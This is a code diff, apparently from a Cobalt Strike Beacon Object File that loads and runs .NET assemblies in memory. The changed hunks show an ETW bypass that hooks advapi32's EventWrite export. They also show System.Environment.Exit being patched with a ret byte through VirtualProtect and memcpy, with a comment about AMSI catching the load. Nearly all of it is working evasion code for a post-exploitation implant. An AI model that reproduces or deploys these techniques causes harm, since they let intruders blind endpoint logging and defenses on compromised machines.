@@ -39,7 +39,7 @@ int go(char* args, ULONG length)
     
 	/* Bypass ETW with EAT Hooking */
 	if (patchEtwflag != 0) {
-		BeaconPrintf(CALLBACK_OUTPUT, "Patching ETW");
+		BeaconPrintf(CALLBACK_OUTPUT, "EAT Hooking ETW");
 		HMODULE advapi = KERNEL32$LoadLibraryA("advapi32.dll");
 		PVOID originalFunc = (PVOID)KERNEL32$GetProcAddress(advapi, "EventWrite");
 		if (!EATHook(advapi, const_cast<char*>("EventWrite"), reinterpret_cast<VOID*>(&DummyFunction), reinterpret_cast<VOID**>(&originalFunc)))
@@ -131,7 +131,8 @@ BOOL Executedotnet(PBYTE AssemblyBytes, ULONG AssemblySize, LPCWSTR wAssemblyArg
 		BeaconPrintf(CALLBACK_OUTPUT, "[-] AppDomain->Load_3 Failed with Error: %lx", HResult); // This will fail if caught by AMSI
 	}
 	
-	if (patchExitflag == 1) {
+	if (patchExitflag != 0) {
+		BeaconPrintf(CALLBACK_OUTPUT, "Patching System.Environment.Exit");
 	    if (!patchExit(runtimeHost))
 	        return FALSE;
 	}
@@ -413,9 +414,7 @@ BOOL patchExit(ICorRuntimeHost* runtimeHost) // Credits: Kyle Avery "Unmanaged .
 	runtimeHost->GetDefaultDomain(&appDomainUnk);
 
 	_AppDomain* appDomain;
-	//appDomainUnk->QueryInterface(IID_PPV_ARGS(&appDomain));
 	appDomainUnk->QueryInterface(xIID_AppDomain, (VOID**)&appDomain);
-	// IUAppDomain->QueryInterface(xIID_AppDomain, (VOID**)&AppDomain);
 
 	_Assembly* mscorlib;
 	appDomain->Load_2(OLEAUT32$SysAllocString(L"mscorlib, Version=4.0.0.0"), &mscorlib);
@@ -465,7 +464,7 @@ BOOL patchExit(ICorRuntimeHost* runtimeHost) // Credits: Kyle Avery "Unmanaged .
 
 	DWORD oldProt = 0;
 	BYTE patch = 0xC3;
-	BeaconPrintf(CALLBACK_OUTPUT, "[U] Exit function pointer: 0x%p\n", exitPtr.byref);
+	//BeaconPrintf(CALLBACK_OUTPUT, "[U] Exit function pointer: 0x%p\n", exitPtr.byref);
 	KERNEL32$VirtualProtect(exitPtr.byref, 1, PAGE_READWRITE, &oldProt);
 	MSVCRT$memcpy(exitPtr.byref, &patch, 1);
 	KERNEL32$VirtualProtect(exitPtr.byref, 1, oldProt, &oldProt);
